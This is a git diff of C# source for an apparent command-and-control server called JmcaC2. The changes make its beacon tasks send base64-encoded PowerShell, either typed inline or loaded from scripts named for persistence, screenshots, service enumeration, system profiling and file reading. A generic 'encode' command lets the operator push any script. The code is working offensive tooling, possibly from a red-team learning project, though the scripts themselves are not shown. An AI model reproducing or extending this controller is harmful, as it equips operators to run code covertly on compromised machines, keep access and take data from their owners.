@@ -1,7 +1,6 @@
 ﻿using System.Net;
-using System.Net.Http;
 using System.Security.Cryptography;
-using System.Security.Cryptography.X509Certificates;
+using System.Text;
 
 
 namespace JmcaC2
@@ -21,6 +20,9 @@ namespace JmcaC2
         static BeaconClient? CurrentBeacon = null;
         static HashSet<string> ClientNames = new HashSet<string>();
 
+        // make configurable somehow (as arg?) must end in \\
+        static string scriptsPath = "C:\\Users\\isaac\\source\\repos\\JmcaC2\\scripts\\";
+
         public static void Main(string[] args)
         {
             // plan for command and control server
@@ -31,6 +33,19 @@ namespace JmcaC2
             //   3. accept stdin commands to add tasks, view results, etc.
 
             Console.WriteLine("Welcome to JmcaC2 Controller 🇯🇲");
+
+            // set the scripts path via arg
+            if (args.Length > 1)
+            {
+                if (!Directory.Exists(args[0]))
+                {
+                    Console.WriteLine("Invalid scripts path: " + args[0]);
+                }
+                else
+                {
+                    scriptsPath = args[0];
+                }
+            }
 
             // setup the http listener
             listener.Prefixes.Add($"https://localhost:{port}/");
@@ -94,29 +109,73 @@ namespace JmcaC2
                     case "tasks":
                         PrintTasks();
                         break;
-                    //TODO: process injection command, with shellcode passed as DATA in BeaconTask
-                    case "powershell":
-                        CreateTask(CmdPrefix, CmdArgs);
-                        break;
-
-                    case "enumservices":
-                        CreateTask(CmdPrefix, CmdArgs);
-                        break;
                     case "sleep":
                         CreateTask(CmdPrefix, CmdArgs);
                         break;
+                    case "powershell":
+                        {
+                            byte[] bytes = Encoding.Unicode.GetBytes(CmdArgs);
+                            string encoded = Convert.ToBase64String(bytes);
+                            CreateTask("stream", encoded);
+                        }
+                        break;
+                    case "enumservices":
+                        {   
+                            string encoded = EncodePowershellScript("enumservices.ps1");
+                            CreateTask("file", encoded);
+                        }
+                        break;
                     case "systemprofile":
-                        CreateTask(CmdPrefix, CmdArgs);
+                        {   
+                            string encoded = EncodePowershellScript("systemprofile.ps1");
+                            CreateTask("file", encoded);
+                        }
                         break;
 
                     case "screenshot":
-                        CreateTask(CmdPrefix, CmdArgs);
+                        {   
+                            string encoded = EncodePowershellScript("screenshot.ps1");
+                            CreateTask("file", encoded);
+                        }
                         break;
                     case "persistence":
-                        CreateTask(CmdPrefix, CmdArgs);
+                        {   
+                            string encoded = EncodePowershellScript("persistence.ps1");
+                            CreateTask("file", encoded);
+                        }
                         break;
                     case "file":
-                        CreateTask(CmdPrefix, CmdArgs);
+                        {   
+                            string encoded = EncodePowershellScript("read-file.ps1");
+                            CreateTask("file", encoded);
+                        }
+                        break;
+                    case "encode":
+                        {
+
+                            // <response-type> := stream | file
+                            // read in powershell script
+                            // encode
+                            // create task
+                            // Usage: encode <response-type> <powershell-script-path>
+                            string[] CmdData = CmdArgs.Trim().Split(" ", 2);
+                            string responseType = CmdData.Length > 0 ? CmdData[0].ToLower() : "";
+                            string psPath = CmdData.Length > 1 ? CmdData[1].ToLower() : "";
+
+                            if (string.IsNullOrEmpty(responseType) || string.IsNullOrEmpty(psPath))
+                            {
+                                Console.WriteLine("Usage: encode <response-type> <powershell-script-path>");
+                            }
+                            else if (responseType != "stream" && responseType != "file")
+                            {
+                                Console.WriteLine("response-type must be file or stream");
+                            }
+                            else
+                            {
+                                string encoded = EncodePowershellScript(psPath);
+                                CreateTask(responseType, encoded);
+                            }
+                        }
                         break;
                     // add more commands as needed :)
 
@@ -130,6 +189,27 @@ namespace JmcaC2
 
         // View currently active beacon connections
 
+        static private string EncodePowershellScript(string psPath)
+        {
+            if (string.IsNullOrEmpty(psPath))
+            {
+                Console.WriteLine("Powershell script path cannot be null or empty");
+                return string.Empty;
+            }
+
+            if (!File.Exists(scriptsPath + psPath))
+            {
+                Console.WriteLine("File not found: " + scriptsPath + psPath);
+                return string.Empty;
+            }
+
+            // read as UTF-8
+            string scriptText = File.ReadAllText(scriptsPath + psPath);
+            // must be Unicode to work as encoded ps (UTF-16)
+            byte[] bytes = Encoding.Unicode.GetBytes(scriptText);
+            string encoded = Convert.ToBase64String(bytes);
+            return encoded;
+        }
 
         static private void CreateTask(string CmdPrefix, string CmdArgs)
         {
